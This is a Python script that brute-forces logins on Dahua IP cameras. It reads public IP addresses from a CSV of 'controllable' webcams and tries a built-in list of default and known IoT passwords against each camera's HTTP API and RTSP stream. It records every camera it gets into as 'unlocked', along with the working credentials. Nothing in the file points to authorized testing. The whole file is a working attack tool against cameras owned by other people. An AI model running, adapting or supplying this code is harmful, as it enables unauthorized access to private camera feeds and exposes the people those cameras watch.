"""Dahua HTTP/RTSP brute forcer.

Tests Dahua cams (commonly found on /cam/realmonitor endpoint) with
default credentials. Dahua has a well-known default password and supports
a proprietary HTTP API.
"""
import socket
import time
import json
import re
import base64
import hashlib
import random
import os
import sys
import urllib.request
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import glob

# Force unbuffered
sys.stdout.reconfigure(line_buffering=True)

# Dahua credentials to test
CREDS = [
    ('admin', 'admin'),
    ('admin', ''),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', 'dahua'),
    ('admin', 'Dahua'),
    ('admin', 'password'),
    ('admin', 'system'),
    ('admin', 'admin123'),
    ('admin', 'Admin'),
    ('admin', 'Admin123'),
    ('admin', 'Admin12345'),
    ('admin', '7ujMko0admin'),
    ('admin', '7ujMko0'),
    ('admin', 'vizxv'),
    ('admin', '1234'),
    ('admin', '9999'),
    ('admin', '00000000'),
    ('admin', 'pass'),
    ('admin', 'root'),
    ('root', 'root'),
    ('root', 'vizxv'),
    ('root', 'xc3511'),
    ('user', 'user'),
    ('666666', '666666'),
    ('888888', '888888'),
]

PROGRESS_FILE = 'dahua_bf_progress.json'


def try_dahua_http(host, port, user, pwd, timeout=4):
    """Try Dahua HTTP API login."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Dahua API: /cgi-bin/magicBox.cgi?action=getSystemInfo + /RPC2_Login
    # Common endpoint: /cgi-bin/hi3510/param.cgi
    urls = [
        f'http://{host}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo',
        f'http://{host}:{port}/cgi-bin/hi3510/param.cgi?cmd=getversion',
    ]
    # Try with basic auth
    for url in urls:
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Dahua',
                'Authorization': 'Basic ' + base64.b64encode(f'{user}:{pwd}'.encode()).decode(),
            })
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                data = r.read(8192)
                if r.status == 200 and len(data) > 10:
                    return ('200', data[:200].decode('utf-8', errors='replace'))
        except urllib.error.HTTPError as e:
            if e.code == 401:
                continue
            return ('err', str(e)[:50])
        except Exception:
            pass
    return ('401', '')


def try_dahua_rtsp(host, port, user, pwd, path, timeout=4):
    """Try Dahua RTSP."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        url = f'rtsp://{user}:{pwd}@{host}:{port}{path}'
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n\r\n'
        s.send(req.encode())
        data = s.recv(2048)
        s.close()
        if b'200' in data:
            return ('200', data[:200].decode('utf-8', errors='replace'))
        if b'401' in data:
            return ('401', '')
        return ('other', data[:100].decode('utf-8', errors='replace'))
    except Exception as e:
        return ('err', str(e)[:50])


def main():
    # Get target IPs from CSV (Dahua cams)
    CSV_PATH = None
    for f in glob.glob(r'C:\Users\eli6-admin\Documents\**/controllable_Webcams.csv', recursive=True):
        CSV_PATH = f
        break
    csv.field_size_limit(2**31 - 1)
    targets = set()
    with open(CSV_PATH, 'r', encoding='utf-8', errors='replace') as f:
        for row in csv.DictReader(f):
            url = row.get('url', '') or ''
            brand = (row.get('brand') or '').lower()
            m = re.match(r'(?:rtsp|http)s?://(?:[^@]+@)?(\d+\.\d+\.\d+\.\d+)', url)
            if m:
                ip = m.group(1)
                # IP cam targets (Dahua-style URLs are common)
                if 'dahua' in brand or 'realmonitor' in url or 'magicBox' in url:
                    targets.add(ip)
    print(f'[Dahua BF] {len(targets)} target IPs')

    # Load progress
    progress = {'tested': set(), 'unlocked': []}
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE) as f:
            p = json.load(f)
        progress['tested'] = set(p.get('tested', []))
        progress['unlocked'] = p.get('unlocked', [])
        print(f'  Loaded {len(progress["tested"])} tested, {len(progress["unlocked"])} unlocked')

    # Process targets
    for i, ip in enumerate(sorted(targets)):
        if ip in progress['tested']:
            continue
        # Try HTTP API
        for user, pwd in CREDS[:10]:
            status, body = try_dahua_http(ip, 80, user, pwd, timeout=3)
            if status == '200':
                print(f'  [{ip}] HTTP {user}:{pwd} -> 200!', flush=True)
                progress['unlocked'].append({
                    'ip': ip, 'protocol': 'http', 'user': user, 'pwd': pwd,
                    'body': body[:200],
                })
                break
            time.sleep(0.2)
        # Try RTSP
        for user, pwd in CREDS[:5]:
            for path in ['/cam/realmonitor', '/live', '/']:
                status, body = try_dahua_rtsp(ip, 554, user, pwd, path, timeout=3)
                if status == '200':
                    print(f'  [{ip}] RTSP {user}:{pwd} {path} -> 200!', flush=True)
                    progress['unlocked'].append({
                        'ip': ip, 'protocol': 'rtsp', 'user': user, 'pwd': pwd,
                        'path': path, 'body': body[:200],
                    })
                    break
                time.sleep(0.2)
        progress['tested'].add(ip)

        if (i + 1) % 5 == 0:
            print(f'  [{i+1}/{len(targets)}] tested={len(progress["tested"])} unlocked={len(progress["unlocked"])}', flush=True)
            with open(PROGRESS_FILE, 'w') as f:
                json.dump({
                    'tested': list(progress['tested']),
                    'unlocked': progress['unlocked'],
                }, f, indent=2)

    # Final save
    with open(PROGRESS_FILE, 'w') as f:
        json.dump({
            'tested': list(progress['tested']),
            'unlocked': progress['unlocked'],
        }, f, indent=2)
    print(f'\n[Dahua BF] Final: tested={len(progress["tested"])} unlocked={len(progress["unlocked"])}')


if __name__ == '__main__':
    main()
